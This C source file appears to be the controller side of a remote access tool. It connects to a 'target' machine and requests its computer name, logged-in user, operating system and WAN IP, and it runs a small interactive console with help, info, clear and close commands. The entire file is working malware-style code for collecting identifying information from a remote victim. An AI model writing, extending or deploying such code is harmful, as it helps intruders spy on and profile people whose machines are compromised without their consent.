#include "handler.h"

extern int cli_fd;
extern int serv_fd;
extern struct sockaddr_in cli_addr;

char command[1024];
char info[] = "info";
char Close[] = "close";
char help[] = "help";
char clear[] = "clear";

char HELP[] = "	\n\n	[ HELP MENU ]\n\n	[ help - Show This Window ]\n	[ info - Show Target System Information ]\n	[ clear - Clear The Console ]\n	[ close - Close Current Connection ]\n	[ HELP MENU ]\n\n";

char target_name[1024];
char target_user[1024];
char target_os[1024];
char target_wanip[1024];

void GetSystemInfo(){

	SendData(cli_fd, info);

	printf("	[>>] Waiting For System Info......\n");

	RecvData(cli_fd, target_name);

	RecvData(cli_fd, target_user);

	RecvData(cli_fd, target_os);

	RecvData(cli_fd, target_wanip);

	printf("\n	[ System Information ]\n\n");

	printf("	Computer Name ---- %s\n", target_name);

	printf("	Current User  ---- %s\n", target_user);

	printf("	OS            ---- %s\n", target_os);

	printf("	WANIP         ---- %s\n", target_wanip);

	printf("\n	[ System Information ]\n\n");

	printf("	[>>] Info Successfully Received\n");

}

void Shell(){

	char *user = getenv("USER");

	sleep(1);

	while(1){

		memset(command, 0, sizeof(command));

		printf("	%s@%s:~$", user, inet_ntoa(cli_addr.sin_addr));

		if(fgets(command, sizeof(command), stdin) == NULL){

			ErrorQuit("	[!!] Error Getting input command");

		}

		if(strncmp(command, help, strlen(help)) == 0){

			printf(HELP);

			continue;

		} else if(strncmp(command, clear, strlen(clear)) == 0){

			system("clear");

			continue;

		} else if(strncmp(command, info, strlen(info)) == 0){

			GetSystemInfo();

			continue;

		} else if(strncmp(command, Close, strlen(Close)) == 0){

			printf("	[>>] Closing Connection......\n");

			SendData(cli_fd, Close);

			break;

		} else {

			printf("	[!!] Invalid Command \n");

		}

	}

}
